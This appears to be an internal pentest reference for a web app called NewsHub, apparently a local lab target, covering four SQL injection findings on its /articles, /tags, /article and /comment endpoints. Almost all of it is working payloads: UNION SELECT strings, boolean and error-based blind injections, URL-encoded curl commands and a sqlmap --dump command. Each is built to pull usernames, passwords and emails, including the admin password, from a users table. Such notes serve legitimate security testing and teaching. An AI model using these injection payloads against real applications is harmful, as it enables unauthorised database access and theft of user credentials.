Pentest Notes – NewsHub

Internal exploitation reference for security assessment of this application.

VULN-9 UNION – Retrieving Data from Other Tables

Endpoint: GET /articles?cat=<value>

Context: The cat parameter is injected into a 5-column SELECT (id, title, category, author, created_at). A UNION attack can pull rows from any other table.

Goal: Extract credentials from the users table.

# Confirm columns
' UNION SELECT NULL,NULL,NULL,NULL,NULL--

# Dump users table
' UNION SELECT id::text,username,password,email,'x' FROM users--

# cURL
curl "http://localhost:8083/articles?cat=%27+UNION+SELECT+id%3A%3Atext%2Cusername%2Cpassword%2Cemail%2C%27x%27+FROM+users--"
VULN-10 UNION – Multiple Values in a Single Column

Endpoint: GET /tags?tag=<value>

Context: 3-column query (title, author, category) over a JOIN. Use PostgreSQL string concatenation || to pack multiple fields into one column.

# Verify 3 columns
' UNION SELECT NULL,NULL,NULL--

# Concatenate username + password + email into column 2
' UNION SELECT NULL,username||'~'||password||'~'||email,NULL FROM users--

# cURL
curl "http://localhost:8083/tags?tag=%27+UNION+SELECT+NULL%2Cusername%7C%7C%27~%27%7C%7Cpassword%2CNULL+FROM+users--"
VULN-11 Blind SQLi – Conditional Responses

Endpoint: GET /article?id=<value>

Context: Boolean-based blind injection. When injected condition is TRUE the article renders; when FALSE the page shows "not found". Use SUBSTRING to extract secrets character by character.

# TRUE  → article displayed
/article?id=1' AND '1'='1'--

# FALSE → "not found"
/article?id=1' AND '1'='2'--

# Extract admin password first char
/article?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='N'--

# Automate with sqlmap
sqlmap -u "http://localhost:8083/article?id=1" --technique=B --dbms=postgresql --dump
VULN-12 Blind SQLi – Conditional Errors

Endpoint: POST /comment — field article_id

Context: The article_id value is embedded directly in an INSERT…SELECT. Injecting a CAST of a text value to INTEGER causes a PostgreSQL error that is reflected back in the UI, leaking data.

# Trigger CAST error to leak username
article_id = 1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)

# Force error when condition is true
article_id = 1 AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '1' END)

# cURL
curl -X POST http://localhost:8083/comment \
  -d "article_id=1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)&author=x&content=y"

Database: app3_db  |  Tables: articles, tags, article_tags, comments, users  |  Sensitive: users(username, password, email, token)
